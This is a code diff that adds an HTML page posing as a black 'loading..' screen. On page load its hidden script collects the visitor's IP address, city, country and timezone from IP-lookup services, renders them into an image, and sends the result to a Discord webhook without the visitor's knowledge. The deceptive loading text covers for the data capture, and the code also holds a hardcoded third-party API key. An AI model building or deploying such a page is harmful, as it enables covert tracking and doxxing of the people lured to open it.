@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>loading · screen</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #000;
+            color: #ccc;
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            width: 100vw;
+            overflow: hidden;
+            text-align: center;
+            flex-direction: column;
+        }
+        .message { font-size: 1.8rem; letter-spacing: 2px; font-weight: 300; text-shadow: 0 0 5px rgba(200,200,200,0.3); }
+        .small-note { margin-top: 1.2rem; font-size: 1rem; opacity: 0.75; color: #aaa; border-top: 1px solid #222; padding-top: 1.2rem; width: 70%; max-width: 500px; }
+    </style>
+</head>
+<body>
+    <div class="message">loading..</div>
+    <div class="small-note">usually takes around 30 seconds</div>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // ---------- CONFIGURATION ----------
+            // REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL
+            const DISCORD_WEBHOOK = "YOUR_ACTUAL_DISCORD_WEBHOOK_URL_HERE";
+            const IPDATA_API_KEY = "8773c41586084029934439d77d94c403";
+            const IPDATA_URL = `https://api.ipdata.co?api-key=${IPDATA_API_KEY}&fields=ip,city,region,country_name,country_code,time_zone,name,currency,latitude,longitude`;
+            // ------------------------------------
+
+            function getCurrentDate() {
+                const d = new Date();
+                return `${d.toISOString().split('T')[0]} ${d.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' })}`;
+            }
+
+            async function getVisitorInfo() {
+                try {
+                    const response = await fetch(IPDATA_URL);
+                    if (!response.ok) throw new Error(`ipdata error: ${response.status}`);
+                    const data = await response.json();
+                    return {
+                        ip: data.ip || 'N/A',
+                        country: data.country_name || 'Unknown',
+                        country_code: data.country_code || '',
+                        timezone: data.time_zone?.name || 'UTC',
+                        city: data.city || 'Unknown',
+                        region: data.region || ''
+                    };
+                } catch (err) {
+                    console.warn('IP intelligence failed, using fallback');
+                    try {
+                        const fallback = await fetch('https://api.ipify.org?format=json');
+                        const ipData = await fallback.json();
+                        return {
+                            ip: ipData.ip || 'Unknown',
+                            country: 'Could not detect', 
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
+                            country_code: '',
+                            city: '',
+                            region: ''
+                        };
+                    } catch (e) {
+                        return {
+                            ip: 'unknown',
+                            country: 'unknown',
+                            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
+                            country_code: ''
+                        };
+                    }
+                }
+            }
+
+            function generateScreenshotDataURL(ip, country, timezone) {
+                const canvas = document.createElement('canvas');
+                canvas.width = 600;
+                canvas.height = 300;
+                const ctx = canvas.getContext('2d');
+
+                ctx.fillStyle = '#0a0c0e';
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.strokeStyle = '#2a8c8c';
+                ctx.lineWidth = 2;
+                ctx.strokeRect(10, 10, canvas.width-20, canvas.height-20);
+
+                ctx.font = 'bold 16px "Courier New", monospace';
+                ctx.fillStyle = '#b3f0f0';
+                ctx.fillText('🌐 VISITOR SCAN — SCREENSHOT', 30, 60);
+                
+                ctx.beginPath();
+                ctx.moveTo(30, 80);
+                ctx.lineTo(canvas.width-30, 80);
+                ctx.strokeStyle = '#3a6e6e';
+                ctx.stroke();
+
+                ctx.font = '14px "Courier New", monospace';
+                ctx.fillStyle = '#dddddd';
+                ctx.fillText('IP ADDRESS:', 40, 140);
+                ctx.font = 'bold 15px "Courier New", monospace';
+                ctx.fillStyle = '#ffe484';
+                ctx.fillText(`${ip}`, 220, 140);
+
+                ctx.font = '14px "Courier New", monospace';
+                ctx.fillStyle = '#dddddd';
+                ctx.fillText('COUNTRY:', 40, 190);
+                ctx.font = 'bold 15px "Courier New", monospace';
+                ctx.fillStyle = '#ffe484';
+                ctx.fillText(`${country}`, 220, 190);
+
+                ctx.font = '14px "Courier New", monospace';
+                ctx.fillStyle = '#dddddd';
+                ctx.fillText('TIMEZONE:', 40, 240);
+                ctx.font = 'bold 15px "Courier New", monospace';
+                ctx.fillStyle = '#ffe484';
+                ctx.fillText(`${timezone}`, 220, 240);
+
+                ctx.font = '10px monospace';
+                ctx.fillStyle = '#628f8f';
+                ctx.fillText(`generated: ${new Date().toISOString()}`, canvas.width-250, canvas.height-20);
+                
+                return canvas.toDataURL('image/png');
+            }
+
+            async function sendToDiscord(visitor) {
+                if (!DISCORD_WEBHOOK || DISCORD_WEBHOOK === "YOUR_ACTUAL_DISCORD_WEBHOOK_URL_HERE") {
+                    console.error('❌ Please set your actual Discord webhook URL in the code');
+                    return;
+                }
+
+                const dateStr = getCurrentDate();
+                const ip = visitor.ip;
+                const country = visitor.country;
+                const timezone = visitor.timezone || 'unknown';
+                
+                const screenshotDataURL = generateScreenshotDataURL(ip, country, timezone);
+                const blob = await (await fetch(screenshotDataURL)).blob();
+                
+                const formData = new FormData();
+                formData.append('file', blob, 'screenshot_ip.png');
+
+                const embed = {
+                    title: '📸 New page screenshot',
+                    color: 0x0a2f2f,
+                    fields: [
+                        { name: 'IP address', value: `\`${ip}\``, inline: true },
+                        { name: 'Country', value: `\`${country}\``, inline: true },
+                        { name: 'Timezone', value: `\`${timezone}\``, inline: true },
+                        { name: 'Date (UTC)', value: `\`${dateStr}\``, inline: false }
+                    ],
+                    footer: { text: 'page load intelligence • black screen' },
+                    timestamp: new Date().toISOString()
+                };
+
+                const payload = { embeds: [embed] };
+                formData.append('payload_json', JSON.stringify(payload));
+
+                try {
+                    const resp = await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
+                    if (!resp.ok) console.error('Discord webhook failed', await resp.text());
+                    else console.log('✅ embed + image sent');
+                } catch (e) {
+                    console.error('discord error', e);
+                }
+            }
+
+            (async function() {
+                const visitor = await getVisitorInfo();
+                await sendToDiscord(visitor);
+            })();
+        })();
+    </script>
+</body>
+</html>
